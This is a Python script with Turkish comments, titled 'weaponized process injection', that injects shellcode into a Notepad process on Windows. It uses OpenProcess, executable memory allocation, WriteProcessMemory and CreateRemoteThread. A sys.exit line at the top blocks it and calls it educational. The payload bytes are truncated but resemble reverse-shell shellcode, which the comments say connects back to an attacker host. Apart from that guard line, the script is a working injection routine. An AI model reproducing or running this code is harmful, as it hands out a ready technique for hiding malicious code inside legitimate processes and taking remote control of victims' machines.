import ctypes
import sys
import struct

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Process Injection tekniğini uygular. Sadece eğitim içindir.")

print("--- WEAPONIZED PROCESS INJECTION ---")

# Windows API Tanımları
kernel32 = ctypes.windll.kernel32
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

# 1. SİLAHLAŞMIŞ PAYLOAD (Değişen Kısım)
# Simülasyonda burası b"\x90" idi.
# Burası gerçek bir C2 Shellcode'udur (Temsili Hex).
# Bu kod çalıştığında saldırganın sunucusuna (192.168.1.X) ters bağlantı açar.
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
buf += b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
# ... (Devamı binlerce karakter sürer)

def inject(pid):
    print(f"[*] Hedef PID: {pid} (Notepad.exe)")
    
    # 2. HEDEF SÜRECİ AÇ
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print("[-] Erişim Reddedildi.")
        return

    print("[*] Hafızada yer ayrılıyor (VirtualAllocEx)...")
    # 3. HAFIZA TAHSİS ET
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    # 4. ZARARLI KODU YAZ (WriteProcessMemory)
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, buf, len(buf), ctypes.byref(written))
    print(f"[+] Payload enjekte edildi. Adres: {hex(arg_address)}")

    # 5. UZAKTAN ÇALIŞTIR (Tetiği Çek)
    print("[*] Thread başlatılıyor (CreateRemoteThread)...")
    thread_id = ctypes.c_ulong(0)
    kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id))
    
    print("💀 OPERASYON TAMAM. Notepad artık bir zombi.")

if __name__ == "__main__":
    target_pid = input("Notepad PID gir: ")
    inject(target_pid)